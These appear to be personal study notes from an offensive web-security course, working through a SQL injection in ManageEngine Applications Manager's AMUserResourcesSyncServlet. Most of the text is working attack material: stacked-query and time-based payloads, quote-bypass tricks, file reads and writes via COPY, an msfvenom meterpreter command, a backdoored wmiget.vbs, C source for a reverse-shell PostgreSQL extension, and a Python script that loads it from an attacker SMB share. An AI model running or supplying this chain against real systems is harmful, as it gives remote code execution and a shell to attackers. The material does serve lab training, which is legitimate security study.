1
(Zoho Corp., 2020), https://www.manageengine.com/products/applications_manager/ ↩︎

2
(Sharpened Productions, 2020), https://fileinfo.com/extension/do ↩︎


Java web applications use a deployment descriptor file named web.xml to determine how URLs map to servlets,2 which URLs require authentication, and other information. This file is essential when we look for the implementations of any given functionality exposed by the web application.

With that said, within the working directory, we see a WEB-INF folder, which is the Java's default configuration folder path where we can find the web.xml file. This file contains a number of servlet names to servlet classes as well as the servlet name to URL mappings. Information like this will become useful once we know exactly which class we are targeting, since it will tell us how to reach it.

1
(MicroSoft, 2020), https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer ↩︎

2
(Wikipedia, 2020), https://en.wikipedia.org/wiki/Java_servlet ↩︎

By checking the contents of the C:\Program Files (x86)\ManageEngine\AppManager12\working\WEB-INF\lib directory, we notice that it contains a number of JAR files. If we just take a look at the names of these files, we can see that most of them are actually standard third party libraries such as struts.jar or xmlsec-1.3.0.jar. Only four JAR files in this directory appear to be native to ManageEngine. Of those four, AdventNetAppManagerWebClient.jar seems like a good starting candidate due to its rather self-explanatory name.

JD-GUI allows us to do that via the File > Save All Sources menu.


Example query from source code:
```
String query = "select count(*) from Alert where SEVERITY = " + i + " and groupname ='AppManager'";
```

Regular expression used to search for SELECT queries
```
^.*?query.*?select.*?
```

Another approach when reviewing a web application is to start from the front-end user interface implementation and take a look at the HTTP request handlers first.

With that in mind, it is important to know that in a typical Java servlet, we can easily identify the HTTP request handler functions that handle each HTTP request type due to their constant and unique names.

These methods are named as follows:

doGet
doPost
doPut
doDelete
doCopy
doOptions
Since we already mentioned that we like to stay as close as possible to the entry points of user input into the application during the beginning stages of our source code audits, searching for all doGet and doPost function implementations seems like a good option.


Typically, the doPost and doGet functions expect two parameters as shown in the listing below:

```
protected void doGet(HttpServletRequest req,
                     HttpServletResponse resp)
```
Listing 3 - Example of a servlet HTTP request handler method


1
(Oracle, 2015), https://docs.oracle.com/javaee/7/api/javax/servlet/http/HttpServletRequest.html ↩︎

2
(Oracle, 2015), https://docs.oracle.com/javaee/7/api/javax/servlet/http/HttpServletResponse.html ↩︎

3
(Oracle, 2015), https://docs.oracle.com/javaee/7/api/javax/servlet/ServletRequest.html#getParameter-java.lang.String ↩︎


Since ManageEngine uses PostgreSQL as a back end database, we will need to edit its configuration file in order to enable any logging feature. In our virtual machine, the postgresql.conf file is located at the following path: C:\Program Files (x86)\ManageEngine\AppManager12\working\pgsql\data\amdb\postgresql.conf

In order to instruct the database to log all SQL queries we'll change the postgresql.conf log_statement setting to 'all' as shown in the listing below.

```
log_statement = 'all'			# none, ddl, mod, all
```

Listing 6 - Modifying the postgresql.conf file to enable query logging



Once the service is restarted, we will be able to see failed queries in log files, beginning with swissql, in the following directory:

```
C:\Program Files (x86)\ManageEngine\AppManager12\working\pgsql\data\amdb\pgsql_log\
```
Listing 7 - PostgreSQL log directory

```
powershell> dir | sort LastWriteTime | select -last 1
powershell> Get-Content .\postgres_11.log -wait -tail 1 | Select-String -Pattern "select version"
```

Use pgAdmin query tool or

```
psql.exe -U postgres -p 15432

```

Triggering the Vulnerability
When available, analyzing the source code greatly accelerates vulnerability discovery and our understanding of any possible restrictions. Nevertheless, at some point we must trigger the vulnerability to make further progress. In order to do so, we need a URL to start crafting our request.

From the servlet mapping initially discovered in the web.xml file, we know that the URL we need to use to reach the vulnerable code is as follows:

```
<servlet-mapping>
    <servlet-name>AMUserResourcesSyncServlet</servlet-name>
    <url-pattern>/servlet/AMUserResourcesSyncServlet</url-pattern>
</servlet-mapping>
```
Listing 8 - The servlet mapping

```
<servlet>
    <servlet-name>AMUserResourcesSyncServlet</servlet-name>
    <servlet-class>com.adventnet.appmanager.servlets.comm.AMUserResourcesSyncServlet</servlet-class>
</servlet>
```
Listing 9 - The mapping location

Remember that during our analysis, we established that to reach the vulnerable SQL query, we only require two parameters in our request, namely ForMasRange and userId.

Putting all the information together, our initial request will look like this:

```
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1; HTTP/1.1
Host: manageengine:8443
```
Listing 10 - Triggering the vulnerability

Notice that the request above performs a basic injection using a semicolon. The reason for this is because we already know what the vulnerable query looks like (Listing 11) and we know that it does not contain any quoted strings. Therefore, trying to simply terminate the query with a semicolon at the injection point should work well.

```
String qry = "select distinct(RESOURCEID) from AM_USERRESOURCESTABLE
where USERID=" + userId + " and RESOURCEID >" + stRange + " and
RESOURCEID < " + endRange;
```
Listing 11 - The SQL query taken from the code. Notice how there are no quotes that need to be escaped.

```
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main():
	if len(sys.argv) != 2:
		print "(+) usage %s <target>" % sys.argv[0]
		print "(+) eg: %s target" % sys.argv[0]
		sys.exit(1)
	
	t = sys.argv[1]
	
	sqli = ";"

	r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % t, 
					  params='ForMasRange=1&userId=1%s' % sqli, verify=False)
	print r.text
	print r.headers

if __name__ == '__main__':
	main()
```
Listing 12 - Sample proof-of-concept to trigger the vulnerability

When we send our trigger request through Burp or a simple Python script (Listing 12), we get a response that is not very verbose. As a matter of fact, it is virtually empty as indicated by the Content-Length of 0.

```
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID_APM_9090=5A0EF105FBA016EA342E8B6F20B8FB63;
Path=/; Secure; HttpOnly
Content-Type: text/html;charset=UTF-8
Content-Length: 0
Date: Sat, 26 Nov 2016 08:57:40 GMT
```
Listing 13 - The HTTP response from the SQL Injection GET request

This is worth noting because in the case of a black box test, we would almost have no way of knowing that an SQL injection vulnerability even exists. The HTTP server does not pass through any kind of verbose errors, any POST body changes, or 500 status codes. In other words, at first glance everything seems okay.

Yet, when we look into the previously mentioned log file located in the C:\Program Files (x86)\ManageEngine\AppManager12\working\pgsql\data\amdb\pgsql_log\ directory, we see an error message that is clearly indicative of an SQL injection:

```
[ 2018-04-21 04:33:39.928 GMT ]:LOG:  execute <unnamed>: select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1
[ 2018-04-21 04:33:39.929 GMT ]:ERROR:  syntax error at or near "and" at character 2
[ 2018-04-21 04:33:39.929 GMT ]:STATEMENT:   and RESOURCEID >1 and RESOURCEID < 10000001
```
Listing 14 - The injected ";" character breaks The SQL query confirming the presence of a vulnerability

Before we continue we need to provide a little but more detail about this particular vulnerability. In a brand new installation of our target web application, the data table that is used in the vulnerable query (AM_USERRESOURCESTABLE) does not contain any data. When this is true, it can lead to misleading or incomplete results if we only try injecting trivial payloads. Let's see why that is.

If we pay close attention, we can see that we have a few options for the type of payload we can inject. One approach would be to use a UNION query and extract data directly from the database. However, we need to be mindful of the fact that the RESOURCEID column that the original query is referencing, is defined as a BIGINT datatype. In other words, we could only extract arbitrary data when it is of the same data type.

select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1 UNION SELECT 1
Listing 15 - A simple UNION injection payload

Another option is to use a UNION query with a boolean-based blind injection. Similar to what we have already seen in ATutor, we could construct the injected queries to ask a series of TRUE and FALSE questions and infer the data we are trying to extract in that fashion.

select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1 UNION SELECT CASE WHEN (SELECT 1)=1 THEN 1 ELSE 0 END
Listing 16 - An injection payload using UNION and a boolean conditional statement

The reason why we are not considering this approach is because one of the great things about Postgres SQL-injection attacks is that they allow an attacker to perform stacked queries. This means that we can use a query terminator character in our payload, as we saw in Listing 10, and inject a completely new query into the original vulnerable query string. This makes exploitation much easier since neither the injection point nor the payload are limited by the nature of the vulnerable query.

The downside with stacked queries is that they return multiple result sets. This can break the logic of the application and with it the ability to exfiltrate data with a boolean blind-based attack. Unfortunately, this is exactly what happens with our ManageEngine application. An example error message from the application logs (C:\Program Files (x86)\ManageEngine\AppManager12\logs\stdout.txt) when using stacked queries can be seen below.

```
[30 Nov 2018 07:40:23:556] SYS_OUT: AMConnectionPool : Error while executing query select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1;SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END)-- and RESOURCEID >1 and RESOURCEID < 10000001. Error Message : Multiple ResultSets were returned by the query.
```
Listing 17 - Using stacked queries with boolean-based payloads results in the breakdown of application logic

In order to solve this problem and still be able to use the flexibility of stacked queries, we have to resort to time-based blind injection payloads.

In the case of PostgreSQL, to confirm the blind injection we would use the pg_sleep function, as shown in the listing below.

```
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;
select+pg_sleep(10); HTTP/1.1
Host: manageengine:8443
```
Listing 18 - Causing the database to sleep for 10 seconds before returning

Note that the plus sign between select and pg_sleep will be interpreted as a space. This could also be substituted with the “%20” characters, which are the URL-encoded equivalent of a space.

Now that we have verified our ability to execute stacked queries along with time-based blind injection, we can continue our exploit development.

```
curl -k -v 'https://manageengine:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1+UNION+SELECT+CASE+WHEN+(SELECT+1)=1+THEN+1+ELSE+0+END'
curl -k -v 'https://manageengine:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1+UNION+SELECT+1'
curl -k -v 'https://manageengine:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;select+pg_sleep(10);'
         
```
Ex.

```
grep -r -P "^.*?query.*?select.*?where.*?(\+)+.*?" *

curl -k -v 'https://manageengine:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;select+pg_sleep(10);'
```
found issue with < and > and '

```
ERROR:  column "lt" does not exist at character 85
[ 2024-03-28 21:49:00.781 GMT ]:STATEMENT:  select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1 union select &lt
```
Single quote became &#39
```
select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1&#39
```

How Houdini Escapes

postgres allows stacked query.

Single quote in string
```
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1' HTTP/1.1
Host: manageengine:8443
```
Listing 19 - Sending an SQL Injection payload that contains a single quote

Looking at the log file we see the following error:
```
[ 2018-04-21 04:42:58.221 GMT ]:ERROR:  operator does not exist: integer &# integer at character 73
[ 2018-04-21 04:42:58.221 GMT ]:HINT:  No operator matches the given name and argument type(s). You might need to add explicit type casts.
[ 2018-04-21 04:42:58.221 GMT ]:STATEMENT:  select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1&#39
```
Listing 20 - The SQL error message in the log file

As it turns out, special characters are HTML-encoded before they are sent to the database for further processing. This causes us a few headaches as it seems that we cannot use quoted string values in our queries.

In case of myaql:

```
MariaDB [mysql]> select concat('1337',' h@x0r')
    -> ;
+-------------------------+
| concat('1337',' h@x0r') |
+-------------------------+
| 1337 h@x0r              |
+-------------------------+
1 row in set (0.00 sec)

MariaDB [mysql]> select concat(0x31333337,0x206840783072)
    -> ;
+-----------------------------------+
| concat(0x31333337,0x206840783072) |
+-----------------------------------+
| 1337 h@x0r                        |
+-----------------------------------+
1 row in set (0.00 sec)
```

As shown in the listing above, the ASCII characters in their hexadecimal representation are automatically decoded by the MySQL engine.

As an example, the listing below shows how to make use of the decode function in PostgreSQL to convert our "AWAE" base64 encoded string:

```
select convert_from(decode('QVdBRQ==', 'base64'), 'utf-8');
```
Listing 22 - Using the decode function in PostgreSQL. Note: we still need quotes!

1
(The PostgreSQL Global Development Group, 2020), https://www.postgresql.org/docs/9.2/static/functions-string.html ↩︎


##### Using CHR and String Concatenation

we can select individual characters using their code points2 (numbers that represent characters) and concatenate them together using the double pipe (||) operator.

```
amdb=#SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);
?column?
--------
AWAE
(1 row)
```

The problem is that character concatenation only works for basic queries such as SELECT, INSERT, DELETE, etc. It does not work for all SQL statements.

```
amdb=# CREATE TABLE AWAE (offsec text); INSERT INTO AWAE(offsec) VALUES (CHR(65)||CHR(87)||CHR(65)||CHR(69));
CREATE TABLE
INSERT 0 1
amdb=# SELECT * from AWAE;
 offsec
--------
 AWAE
(1 row)

```

###### CHR does not work for COPY function

```
CREATE TABLE AWAE (offsec text);
INSERT INTO AWAE(offsec) VALUES (CHR(65)||CHR(87)||CHR(65)||CHR(69));
COPY AWAE (offsec) TO CHR(99)||CHR(58)||CHR(92)||CHR(92)||CHR(65)||CHR(87)||CHR(65)||CHR(69));
ERROR:  syntax error at or near "CHR"
LINE 3: COPY AWAE (offsec) TO CHR(99)||CHR(58)||CHR(92)||CHR(92)||CH...
                              ^

********** Error **********
```
(The PostgreSQL Global Development Group, 2020), https://www.postgresql.org/docs/9.1/static/functions-string.html ↩︎

2
(Wikipedia, 2020), https://en.wikipedia.org/wiki/Code_point ↩︎

##### It Makes Lexical Sense

PostgreSQL syntax also supports dollar-quoted string constants. Their purpose is to make it easier to read statements that contain strings with literal quotes.

Essentially, two dollar characters ($$) can be used as a quote (') substitute by themselves, or a single one ($) can indicate the beginning of a "tag." The tag is optional, can contain zero or more characters, and is terminated with a matching dollar ($). If used, this tag is then required at the end of the string as well.

```
SELECT 'AWAE';
SELECT $$AWAE$$;
SELECT $TAG$AWAE$TAG$;
```
This allows us to fully bypass the quotes restriction we have previously encountered as shown in the listing below.

```
CREATE TEMP TABLE AWAE(offsec text);INSERT INTO AWAE(offsec) VALUES ($$test$$);
COPY AWAE(offsec) TO $$C:\Program Files (x86)\PostgreSQL\9.2\data\test.txt$$;

COPY 1

Query returned successfully in 201 msec.
```


1 (The PostgreSQL Global Development Group, 2020), https://www.postgresql.org/docs/9.2/static/sql-syntax-lexical.html ↩︎

#### Blind Bats

```
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;<some query>;--+ HTTP/1.0
Host: manageengine:8443
```
Listing 28 - The ability for us to execute arbitrary SQL statements through stacked queries

```
SELECT current_setting('is_superuser');
```
Listing 29 - Checking our DB privileges

```
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+
Host: manageengine:8443
```
Listing 30 - Checking if we are DBA

```
COPY <table_name> from <file_name>
```
Listing 31 - Reading content from files

```
COPY <table_name> to <file_name>
```
Listing 32 - Writing content to files

```
COPY (select $$awae$$) to <file_name>
```
Listing 33 - Using a subquery to return valid data so that the COPY operation can write to a file

```
CREATE temp table awae (content text);
COPY awae from $$c:\awae.txt$$;
SELECT content from awae;
DROP table awae;
```
Listing 34 - Reading content from file C:\awae.txt


We can implement this attack in a blind time-based query as follows:
```
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;create+temp+table+awae+(content+text);copy+awae+from+$$c:\awae.txt$$;select+case+when(ascii(substr((select+content+from+awae),1,1))=104)+then+pg_sleep(10)+end;--+ HTTP/1.0
Host: manageengine:8443
```
Listing 35 - Reading the first character of the fle C:\awae.txt and comparing it with the letter "h". If the letter is "h", sleep for 10 seconds.

```
COPY (SELECT $$offsec$$) to $$c:\\offsec.txt$$;
```
Listing 36 - A simple query that will write to the disk in c:\

We can translate that into the following request:

```
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;COPY+(SELECT+$$offsec$$)+to+$$c:\\offsec.txt$$;--+ HTTP/1.0
Host: manageengine:8443
```
Listing 37 - Writing to the file system using our SQL Injection vulnerability


```
 └─$ cat poc-me3.py                     
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main():
    if len(sys.argv) != 2:
        print("(+) usage %s <target>" % sys.argv[0])
        print("(+) eg: %s target" % sys.argv[0])
        sys.exit(1)
    
    t = sys.argv[1]
    #proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
   
    #sqli = ";"
    #sqli = ";SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+"
    #sqli = "+UNION+SELECT+CASE+WHEN+(SELECT+1)=1+THEN+1+ELSE+0+END"
    #sqli = "+UNION+SELECT+1"
    #sqli = ";select+pg_sleep(10);"
    sqli = ";COPY+(SELECT+$$offsec$$)+to+$$c:\\offsec.txt$$;--+"

    #r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % t, 
    #                  params='ForMasRange=1&userId=1%s' % sqli, verify=False, proxies=proxies)
    r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % t, 
                      params='ForMasRange=1&userId=1%s' % sqli, verify=False)
    
    print(r.text)
    print(r.headers)

if __name__ == '__main__':
    main()
              
```
1
(The PostgreSQL Global Development Group, 2020), https://www.postgresql.org/docs/9.2/static/sql-copy.html ↩︎

##### Reverse Shell Via Copy To

When the ManageEngine Application Manager is configured to monitor remote servers and applications (that is its job after all), a number of VBS scripts are executed on a periodic basis. These scripts are located in the C:\Program\ Files\ (x86)\ManageEngine\AppManager12\working\conf\application\scripts directory and vary by functionality.If we run the Sysinternals Process Monitor1 tool with a VBS path filter on our target host, we can see that one of the files that is executed on a regular basis is wmiget.vbs.

A few things we need to keep in mind are:

We need to make a backup copy of the target file as we will need to restore it once we are done with this attack vector.

We have to convert the content of the target file to a one-liner and make sure it is still executing properly before appending our payload. This is because COPY\ TO can't handle newline control characters in a single SELECT statement.

Our payload must also be on a single line for the same reason as stated above.

We have to encode our payload twice in the GET request. We need to use base64 encoding to avoid any issues with restricted characters within the COPY TO function and we also need to urlencode the payload so that nothing gets mangled by the web server itself. Finally, we need to use the convert_from function to convert the output of the decode function to a human-readable format. The general query that we will use for the injection looks like this:

```
copy (select convert_from(decode($$ENCODED_PAYLOAD$$,$$base64$$),$$utf-8$$)) to $$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;
```
Listing 38 - General structure of the query we inject

We need to use a POST request due to the size of the payload, as it exceeds the limits of what a GET request can process. This is not an issue because, as we previously saw, the doPost function simply ends up calling the doGet function.
Before putting all the pieces together let's generate our meterpreter reverse shell using the following command on Kali:
```
kali@kali:~$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=4444 -e x86/shikata_ga_nai -f vbs
```
Listing 39 - Generating a VBS reverse shell          

-----
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.45.202 LPORT=4444 -e x86/shikata_ga_nai -f vbs > rev.vbs

cat rev.vbs| base64

We url encoded the listing 38 string in post payload  without replacing ENCODED_PAYLOAD

then created msfvenom reverse payload.
 Converted the .vbs payload to a single line.
 converted the original wmiget.vbs to single line.
 
 Offsec suggested adding the payload at the end of existing wmiget.vbs file before quit function.
 But since that didn't work for me, I added it at the beginning of the file.
 
 Then the combined one line .vbs file content was urlencoded usind burp. That urlencoded content was used in replacing ENCODED_PAYLOAD.
 
 
 1
(MicroSoft, 2019), https://docs.microsoft.com/en-us/sysinternals/downloads/procmon ↩︎

PostgreSQL Extensions

```
CREATE OR REPLACE FUNCTION test(text) RETURNS void AS 'FILENAME', 'test' LANGUAGE 'C' STRICT;
```
Listing 40 - Basic SQL syntax to create a function from a local library

However, there is an important restriction that we need to keep in mind. The compiled extension we want to load must define an appropriate Postgres structure (magic block) to ensure that a dynamically library file is not loaded into an incompatible server.

```
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS 'C:\Windows\System32\kernel32.dll', 'WinExec' LANGUAGE C STRICT;
SELECT system('hostname');
ERROR:  incompatible library "c:\Windows\System32\kernel32.dll": missing magic block
HINT: Extension libraries are required to use the PG_MODULE_MAGIC macro.

********** Error **********
```
Listing 41 - Attempting to load a Windows DLL.

##### Build Environment

The following example code can be found in the poc.c source file within the awae solution:
```
01: #include "postgres.h"
02: #include <string.h>
03: #include "fmgr.h"
04: #include "utils/geo_decls.h"
05: #include <stdio.h>
06: #include "utils/builtins.h"
07: 
08: #ifdef PG_MODULE_MAGIC
09: PG_MODULE_MAGIC;
10: #endif
11: 
12: /* Add a prototype marked PGDLLEXPORT */
13: PGDLLEXPORT Datum awae(PG_FUNCTION_ARGS);
14: PG_FUNCTION_INFO_V1(awae);
15: 
16: /* this function launches the executable passed in as the first parameter
17: in a FOR loop bound by the second parameter that is also passed*/
18: Datum
19: awae(PG_FUNCTION_ARGS)
20: {
21: 	/* convert text pointer to C string */
22: #define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))
23: 
24:     /* retrieve the second argument that is passed to the function (an integer)
25:     that will serve as our counter limit*/
26:     int instances = PG_GETARG_INT32(1);
27: 
28:     for (int c = 0; c < instances; c++) {
29:         /*launch the process passed in the first parameter*/
30:         ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);
31:     }
32: 	PG_RETURN_VOID();
33: }
```
Listing 42 - Sample code to get you started


 Build > Build Solution in Visual Studio.
```
------ Build started: Project: awae, Configuration: Release Win32 ------
   Creating library C:\Users\Administrator\source\repos\awae\Release\awae.lib and object C:\Users\Administrator\source\repos\awae\Release\awae.exp
Generating code
Finished generating code
All 3 functions were compiled because no usable IPDB/IOBJ from previous compilation was found.
rs.vcxproj -> C:\Users\Administrator\source\repos\awae\Release\awae.dll
Done building project "rs.vcxproj".
========== Rebuild All: 1 succeeded, 0 failed, 0 skipped ==========
```
Listing 43 - Building the new extension

Testing the Extension
In order to test our newly-built extension, we need to first create a UDF. We can look back on Listing 40 to remind ourselves how to create a custom function in PostgreSQL.

For example, the following queries will create and run a UDF called test, bound to the awae function exported by our custom DLL. Note that we have moved the DLL file to the root of the C drive for easier command writing.
```
amdb# \df test

create or replace function test(text, integer) returns void as $$C:\awae.dll$$, $$awae$$ language C strict;
SELECT test($$calc.exe$$, 3);
```
Listing 44 - The code to load the extension and run the test function

Checking for calc.exe :
```
tasklist | findstr /i calc
taskkill /f /IM calc.exe
```

```
net stop "Applications Manager"

del c:\awae.dll

net start "Applications Manager"

DROP FUNCTION test(text, integer);

\df test

```
##### Loading the Extension from a Remote Location

```
kali@kali:~$ mkdir /home/kali/awae

kali@kali:~$ sudo impacket-smbserver awae /home/kali/awae/
[sudo] password for kali: 
Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
Listing 49 - Starting the Samba service with a simple configuration file to test remote DLL loading


 Once the Samba service is running, we can create a new Postgres UDF and point it to the DLL file hosted on the network share.
```
CREATE OR REPLACE FUNCTION remote_test(text, integer) RETURNS void AS $$\\192.168.119.120\awae\awae.dll$$, $$awae$$ LANGUAGE C STRICT;
SELECT remote_test($$calc.exe$$, 3);
```
Listing 50 - Creating a UDF from a network share. 192.168.119.120 is the Kali attacker IP address.

##### UDF Reverse shell

└─$ cat rev_shell.c   

```

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <stdio.h>
#include <winsock2.h>
#include "utils/builtins.h"
#pragma comment(lib, "ws2_32")

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum connect_back(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(connect_back);

WSADATA wsaData;
SOCKET s1;
struct sockaddr_in hax;
char ip_addr[16];
STARTUPINFO sui;
PROCESS_INFORMATION pi;

Datum
connect_back(PG_FUNCTION_ARGS)
{

        /* convert C string to text pointer */
#define GET_TEXT(cstrp) \
   DatumGetTextP(DirectFunctionCall1(textin, CStringGetDatum(cstrp)))

        /* convert text pointer to C string */
#define GET_STR(textp) \
  DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))

        WSAStartup(MAKEWORD(2, 2), &wsaData);
        s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

        hax.sin_family = AF_INET;
        /* FIX THIS */
        hax.sin_port = htons(PG_GETARG_INT32(1));
        /* FIX THIS TOO*/
        hax.sin_addr.s_addr = inet_addr(GET_STR(PG_GETARG_TEXT_P(0)));

        WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

        memset(&sui, 0, sizeof(sui));
        sui.cb = sizeof(sui);
        sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)s1;

        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
        PG_RETURN_VOID();
}


```
Compile and host the dll on kali. transfer the dll using impacket smb server.

``` 
┌──(kali㉿kali)-[~/repos/web-300/scripts]
└─$ cat me_revshell.py                                    
import requests, sys
requests.packages.urllib3.disable_warnings()

def log(msg):
   print (msg)

def make_request(url, sql):
   log("[*] Executing query: %s" % sql[0:80])
   r = requests.get( url % sql, verify=False)
   return r

def create_udf_func(url):
   log("[+] Creating function...")
   sql = "CREATE OR REPLACE FUNCTION rev_shell(text,integer) RETURNS void AS $$\\\\192.168.45.237\\awae\\rev_shell.dll$$, $$connect_back$$ language c strict"
   make_request(url, sql)

def trigger_udf(url, ip, port):
   log("[+] Launching reverse shell...")
   sql = "select rev_shell($$%s$$, %d)" % (ip, int(port))
   make_request(url, sql)
   
if __name__ == '__main__':
   try:
       server = sys.argv[1].strip()
       attacker = sys.argv[2].strip()
       port = sys.argv[3].strip()
   except IndexError:
       print ("[-] Usage: %s serverIP:port attackerIP port" % sys.argv[0])
       sys.exit()
       
   sqli_url  = "https://"+server+"/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;%s;--" 
   create_udf_func(sqli_url)
   trigger_udf(sqli_url, attacker, port)

```

Calling the python:
```
python3 me_revshell.py manageengine:8443 192.168.45.237 4444
[+] Creating function...
[*] Executing query: CREATE OR REPLACE FUNCTION rev_shell(text,integer) RETURNS void AS $$\\192.168.4
[+] Launching reverse shell...
[*] Executing query: select rev_shell($$192.168.45.237$$, 4444)

```
#### PostgreSQL Large Objects

First, let's try to lay out our goal and the general steps we need to take to get there. Keep in mind that all of these steps should be accomplished using our original SQL injection vulnerability.

Create a large object that will hold our binary payload (our custom DLL file we created in the previous section)
Export that large object to the remote server file system
Create a UDF that will use the exported DLL as source
Trigger the UDF and execute arbitrary code

```
amdb=# select lo_import('C:\\Windows\\win.ini');
 lo_import
-----------
    194206
(1 row)

amdb=# \lo_list
          Large objects
   ID   |  Owner   | Description
--------+----------+-------------
 194206 | postgres |
(1 row)
```

```
amdb=# select lo_import('C:\\Windows\\win.ini', 1337);
 lo_import
-----------
      1337
(1 row)
```
Listing 54 - A lo_import with a known loid

```
amdb=# select loid, pageno from pg_largeobject;
 loid | pageno
------+--------
 1337 |      0
(1 row)
```
Listing 55 - Large objects location

when large objects are imported into a PostgreSQL database, they are split into 2KB chunks, which are then stored individually in the pg_largeobject table.

As the PostgreSQL manual states:

The amount of data per page is defined to be LOBLKSIZE (which is currently BLCKSZ/4, or typically 2 kB).

```
amdb=# select loid, pageno, encode(data, 'escape') from pg_largeobject;
 loid | pageno |           encode
------+--------+----------------------------
 1337 |      0 | ; for 16-bit app support\r+
      |        | [fonts]\r                 +
      |        | [extensions]\r            +
      |        | [mci extensions]\r        +
      |        | [files]\r                 +
      |        | [Mail]\r                  +
      |        | MAPI=1\r                  +
      |        |
(1 row)
```
Listing 56 - The contents of the win.ini file are in a large object

```
amdb=# update pg_largeobject set data=decode('77303074', 'hex') where loid=1337 and pageno=0;
UPDATE 1
amdb=# select loid, pageno, encode(data, 'escape') from pg_largeobject;
 loid | pageno | encode
------+--------+--------
 1337 |      0 | w00t
(1 row)
```
Listing 57 - The contents of the large object are updated.

```
amdb=# select lo_export(1337, 'C:\\new_win.ini');
 lo_export
-----------
         1
(1 row)
```
Listing 58 - Large object export

Deleting objects:
```
amdb=# \lo_unlink 1337
lo_unlink 1337
amdb=# \lo_list
      Large objects
 ID | Owner | Description
----+-------+-------------
(0 rows)
```
Listing 59 - Deleting large objects

(The PostgreSQL Global Development Group, 2020), https://www.postgresql.org/docs/9.2/static/largeobjects.html ↩︎

#### Large Object Reverse Shell

Create a DLL file that will contain our malicious code
Inject a query that creates a large object from an arbitrary remote file on disk
Inject a query that updates page 0 of the newly created large object with the first 2KB of our DLL
Inject queries that insert additional pages into the pg_largeobject table to contain the remainder of our DLL
Inject a query that exports our large object (DLL) onto the remote server file system
Inject a query that creates a PostgreSQL User Defined Function (UDF) based on our exported DLL
Inject a query that executes our newly created UDF

lo_import also creates additional metadata in other tables as well, which are necessary for the lo_export function to work properly. 

we need to deal with the 2KB page boundaries. You may wonder why we don't simply put our entire payload into page 0 and export that. Sadly, that won't work. If any given page contains more than 2048 bytes of data, lo_export will fail. This is why we have to create additional pages with the same loid.

Reverse shell:

```
xxd rev_shell.dll | cut -d" " -f 2-9 | sed 's/ //g' | tr -d '\n' > rev_shell.dll.txt
```


```
python3 manage_engine_sqli.py manageengine:8443 192.168.45.237 4444
```

